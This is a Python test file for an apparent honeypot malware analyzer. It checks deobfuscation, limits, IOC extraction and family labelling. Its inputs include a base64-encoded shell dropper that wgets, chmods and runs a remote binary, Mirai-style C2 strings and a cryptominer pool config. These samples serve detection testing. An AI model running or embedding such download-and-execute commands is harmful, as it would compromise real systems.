"""End to end and fuzz-style cases (spec 6.4): everything returns within limits."""

from __future__ import annotations

import base64
import os
import random
import struct
import time

from suckerpot_analysis import AnalysisResult, CompiledRules, Limits, analyze

from .conftest import make_elf, make_pe

BUDGET_S = 20.0


def timed(data: bytes, rules: CompiledRules, limits: Limits = Limits()) -> AnalysisResult:  # noqa: B008
    start = time.monotonic()
    result = analyze(data, rules=rules, limits=limits)
    assert time.monotonic() - start < BUDGET_S
    assert len(result.strings) <= 500
    assert all(len(s) <= 120 for s in result.strings)
    assert len(result.iocs) <= 200
    # the result must survive the JSON round trip the analyzer uses
    assert AnalysisResult.model_validate_json(result.model_dump_json()) == result
    return result


def test_script_end_to_end(rules: CompiledRules) -> None:
    inner = "cd /tmp; wget http://192.0.2.50/bins/mips -O m; chmod 777 m; ./m"
    payload = base64.b64encode(inner.encode()).decode()
    result = timed(f"#!/bin/sh\necho {payload} | base64 -d | sh\n".encode(), rules)
    assert result.file.kind == "script"
    assert result.deobfuscated is not None
    assert "wget http://192.0.2.50/bins/mips" in result.deobfuscated
    assert [(i.kind, i.value) for i in result.iocs] == [("next_url", "http://192.0.2.50/bins/mips")]
    assert result.deob_steps[0].kind == "base64"
    assert result.digests.sha256


def test_binary_end_to_end(rules: CompiledRules) -> None:
    body = b"\x00/bin/busybox ECCHI\x00/dev/watchdog\x00198.51.100.77:23\x00cnc.example.com\x00"
    result = timed(make_elf(machine=40, bits=32, body=body), rules)
    assert result.file.arch == "arm"
    assert result.family == "mirai"
    assert result.severity == "severe"
    found = {(i.kind, i.value, i.confidence) for i in result.iocs}
    assert ("c2_ip", "198.51.100.77", "high") in found
    assert result.deobfuscated is None


def test_deterministic(rules: CompiledRules) -> None:
    data = make_elf(body=b"\x00hello world strings\x00203.0.113.1:80\x00")
    assert analyze(data, rules=rules) == analyze(data, rules=rules)


def test_pe_and_archive(rules: CompiledRules) -> None:
    assert timed(make_pe(), rules).file.kind == "pe"
    assert timed(b"\x1f\x8b\x08\x00" + os.urandom(1000), rules).file.kind == "gzip"


def test_truncated_headers(rules: CompiledRules) -> None:
    for sample in (make_elf(interp=True, symtab=True), make_pe()):
        for cut in range(0, len(sample), 11):
            timed(sample[:cut], rules)


def test_huge_header_counts(rules: CompiledRules) -> None:
    data = bytearray(make_elf())
    struct.pack_into("<H", data, 56, 0xFFFF)
    struct.pack_into("<H", data, 60, 0xFFFF)
    struct.pack_into("<Q", data, 40, (1 << 64) - 1)
    assert timed(bytes(data), rules).file.kind == "elf"


def test_random_16_mib(rules: CompiledRules) -> None:
    blob = random.Random(1).randbytes(16 * 1024 * 1024)  # noqa: S311
    result = timed(blob, rules)
    assert result.file.kind == "data"


def test_over_limit_input_is_truncated(rules: CompiledRules) -> None:
    result = timed(b"\x00" * (1024 * 1024), rules, Limits(max_input=4096))
    assert "input_truncated" in result.errors


def test_16_mib_single_line(rules: CompiledRules) -> None:
    result = timed(b"A" * (16 * 1024 * 1024), rules)
    assert result.deobfuscated is None  # above the 1 MiB deobfuscation limit
    assert result.strings


def test_1_mib_single_line_script(rules: CompiledRules) -> None:
    result = timed(b"#!/bin/sh\necho " + b"'a''b'" * 170_000, rules)
    assert result.deobfuscated is not None
    assert len(result.deobfuscated.encode()) <= 256 * 1024


def test_deeply_nested_base64(rules: CompiledRules) -> None:
    text = "echo hi"
    for _ in range(30):
        text = (
            "echo " + base64.b64encode((text + "\n" + text).encode()).decode() + " | base64 -d | sh"
        )
        if len(text) > 400_000:
            break
    result = timed(b"#!/bin/sh\n" + text.encode(), rules)
    assert result.deobfuscated is not None
    assert len(result.deobfuscated.encode()) <= 256 * 1024


def test_self_expanding_variable_script(rules: CompiledRules) -> None:
    script = b"#!/bin/sh\na='$a$a$a$a'\n" + b"echo $a\n" * 5000
    result = timed(script, rules)
    assert result.deobfuscated is not None
    assert len(result.deobfuscated.encode()) <= 256 * 1024


def test_regex_pathologies(rules: CompiledRules) -> None:
    timed(b"#!/bin/sh\n" + b"a=" + b"'" * 300_000 + b"\n", rules)
    timed(b"#!/bin/sh\n" + b"echo " + b"A" * 500_000 + b"=" * 3 + b" | base64 -d\n", rules)
    timed(b"1.1.1.1." * 100_000, rules)
    timed(b"a.b.c.d." * 100_000, rules)


def test_web_pages_carry_no_next_stage(rules: CompiledRules) -> None:
    page = (
        b"<!doctype html><html><head><title>t</title>"
        b'<script src="https://cdn.example.test/a.js"></script></head>'
        b'<body><a href="https://www.example.test/x">x</a>'
        b'<img src="http://198.51.100.7/logo.png"></body></html>'
    )
    result = timed(page, rules)
    assert result.file.kind == "html"
    assert result.severity == "info"
    assert result.family is None
    assert result.iocs == []
    assert result.deobfuscated is None
    assert result.strings  # strings are still extracted


def test_huge_web_files_stay_within_limits(rules: CompiledRules) -> None:
    html = b"<html><body>" + b"<div class='a'>x</div>" * 800_000
    assert timed(html, rules).file.kind == "html"
    js = b'"use strict";var a=function(){return 1};' * 400_000
    assert timed(js, rules).file.kind == "javascript"
    css = b"a{color:red}" * 300_000
    assert timed(css, rules).file.kind == "css"
    assert timed(css * 2, rules).file.kind == "text"  # above the style sheet check limit
    pathological = b"{" + b"a:" * 2000 + b"}" + b"<" * 4000
    timed(pathological, rules)
    timed(b"x" * 150 + b"{" + b"y" * 150 + b"{" * 3000, rules)


def test_every_web_kind_has_no_links_and_the_lowest_severity(rules: CompiledRules) -> None:
    bodies = {
        "svg": b'<svg xmlns="http://www.w3.org/2000/svg"><a href="https://example.test/x"/></svg>',
        "xml": b'<?xml version="1.0"?><rss><link>https://example.test/feed</link></rss>',
        "css": b"body{background:url(https://example.test/bg.png)}a{color:red}p{margin:0}",
        "javascript": (
            b'"use strict";var u="https://example.test/api";const f=function(){return u};'
            b"window.f=f;"
        ),
        "json": b'{"update": "https://example.test/app.json", "n": 1}',
    }
    for kind, body in bodies.items():
        result = timed(body, rules)
        assert (result.file.kind, result.severity, result.iocs) == (kind, "info", [])


def test_web_content_that_a_rule_matched_is_read_like_text(rules: CompiledRules) -> None:
    # A miner configuration is valid JSON, so it is web content by format, but a rule matched it:
    # it gets the rule's family and severity, and its links are extracted and followed.
    config = (
        b'{"pools": [{"url": "stratum+tcp://203.0.113.9:4444"}], "donate-level": 1, '
        b'"update": "http://192.0.2.1/xmrig.json"}'
    )
    result = timed(config, rules)
    assert result.file.kind == "json"
    assert (result.family, result.severity) == ("xmrig", "warning")
    assert [(i.kind, i.value) for i in result.iocs] == [("next_url", "http://192.0.2.1/xmrig.json")]
    assert result.deobfuscated is not None


def test_the_same_links_in_a_script_are_followed(rules: CompiledRules) -> None:
    urls = b"https://www.example.test/x http://198.51.100.7/logo.png"
    script = timed(b"#!/bin/sh\nwget " + urls + b"\n", rules)
    assert script.file.kind == "script"
    assert [i.kind for i in script.iocs] == ["next_url", "next_url"]
    bare = timed(b"cd /tmp; wget " + urls, rules)  # no shebang
    assert bare.file.kind == "script"
    assert len(bare.iocs) == 2
    text = timed(b"mirror list: " + urls, rules)  # plain text is still read for links
    assert text.file.kind == "text"
    assert len(text.iocs) == 2
